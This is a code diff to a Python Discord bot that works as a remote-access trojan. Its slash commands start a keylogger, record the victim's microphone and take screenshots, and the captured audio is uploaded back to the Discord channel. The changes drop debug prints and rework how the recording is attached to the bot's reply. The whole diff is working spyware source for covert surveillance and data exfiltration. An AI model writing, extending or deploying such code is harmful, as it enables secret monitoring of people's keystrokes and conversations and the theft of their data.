@@ -91,7 +91,6 @@ async def screenshot(interaction: discord.Interaction):
 
 @client.tree.command(name="keylog", description="Start a keylogger for n seconds. Defaults to 60 seconds", guild=GUILD_ID)
 async def keylog(interaction: discord.Interaction, duration: int=60):
-    print(interaction, duration)
     await interaction.response.defer()
     curDir = os.getcwd()
     klog = keylogger.keylogger(duration)
@@ -105,19 +104,18 @@ async def keylog(interaction: discord.Interaction, duration: int=60):
 
 @client.tree.command(name="microphone", description="Start listening to the user's microphone for n seconds. Defaults to 60 seconds", guild=GUILD_ID)
 async def mictap(interaction: discord.Interaction, duration: int=60):
-    print(interaction, duration)
     await interaction.response.send_message(content="Okiedokie! Listening for {} seconds".format(duration))
-    # Get the original response message
-    GetMsg = await interaction.original_response()
-    print(GetMsg)
+    
     
     curDir = os.getcwd()
     micTap = MicrophoneTap.MicrophoneTap(duration)
     audioFile = micTap.activate()
 
     if audioFile:
-        # Send the audio file as an attachment
-        await interaction.followup.send(file=discord.File("{0}\\{1}".format(curDir, audioFile)))
+        # Edit the original response to include the file attachment
+        msg = await interaction.original_response()
+        await msg.add_files(discord.File("{0}\\{1}".format(curDir, audioFile)))
+        await msg.edit(content=msg.content+"\nFinished the recording!")
 
 token = os.getenv('DISCORD_BOT_TOKEN')
 client.run(token)
